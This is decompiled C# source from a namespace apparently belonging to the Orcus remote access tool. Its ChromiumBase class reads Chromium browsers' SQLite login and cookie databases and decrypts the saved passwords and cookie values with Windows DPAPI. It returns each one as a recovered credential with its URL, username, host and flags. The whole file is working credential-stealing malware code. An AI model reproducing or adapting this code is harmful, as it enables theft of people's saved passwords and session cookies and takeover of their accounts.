using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Utilities;

public class ChromiumBase
{
	public static List<RecoveredPassword> Passwords(string datapath, string browser)
	{
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		List<RecoveredPassword> list = new List<RecoveredPassword>();
		if (!File.Exists(datapath))
		{
			return list;
		}
		SQLiteHandler sQLiteHandler;
		try
		{
			sQLiteHandler = new SQLiteHandler(datapath);
		}
		catch (Exception)
		{
			return list;
		}
		if (!sQLiteHandler.ReadTable("logins"))
		{
			return list;
		}
		int rowCount = sQLiteHandler.GetRowCount();
		for (int i = 0; i < rowCount; i++)
		{
			try
			{
				string value = sQLiteHandler.GetValue(i, "origin_url");
				string value2 = sQLiteHandler.GetValue(i, "username_value");
				string text = Decrypt(sQLiteHandler.GetValue(i, "password_value"));
				if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && text != null)
				{
					RecoveredPassword val = new RecoveredPassword();
					val.set_Field1(value);
					val.set_UserName(value2);
					val.set_Password(text);
					val.set_Application(browser);
					val.set_PasswordType((PasswordType)0);
					list.Add(val);
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	public static List<RecoveredCookie> Cookies(string dataPath, string browser)
	{
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_0138: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_0154: Expected O, but got Unknown
		List<RecoveredCookie> list = new List<RecoveredCookie>();
		if (!File.Exists(dataPath))
		{
			return list;
		}
		SQLiteHandler sQLiteHandler;
		try
		{
			sQLiteHandler = new SQLiteHandler(dataPath);
		}
		catch (Exception)
		{
			return list;
		}
		if (!sQLiteHandler.ReadTable("cookies"))
		{
			return list;
		}
		int rowCount = sQLiteHandler.GetRowCount();
		for (int i = 0; i < rowCount; i++)
		{
			try
			{
				string value = sQLiteHandler.GetValue(i, "host_key");
				string value2 = sQLiteHandler.GetValue(i, "name");
				string value3 = Decrypt(sQLiteHandler.GetValue(i, "encrypted_value"));
				string value4 = sQLiteHandler.GetValue(i, "path");
				long num = long.Parse(sQLiteHandler.GetValue(i, "expires_utc"));
				DateTime expiresUtc = new DateTime(1601, 1, 1).AddMilliseconds((float)num / 1000f);
				bool secure = sQLiteHandler.GetValue(i, "secure") == "1";
				bool httpOnly = sQLiteHandler.GetValue(i, "httponly") == "1";
				if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3))
				{
					RecoveredCookie val = new RecoveredCookie();
					val.set_Host(value);
					val.set_Name(value2);
					val.set_Value(value3);
					val.set_Path(value4);
					val.set_ExpiresUtc(expiresUtc);
					val.set_Secure(secure);
					val.set_HttpOnly(httpOnly);
					val.set_ApplicationName(browser);
					list.Add(val);
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}

	private static string Decrypt(string encryptedData)
	{
		if (string.IsNullOrEmpty(encryptedData))
		{
			return null;
		}
		byte[] bytes = ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), (byte[])null, (DataProtectionScope)0);
		return Encoding.UTF8.GetString(bytes);
	}
}
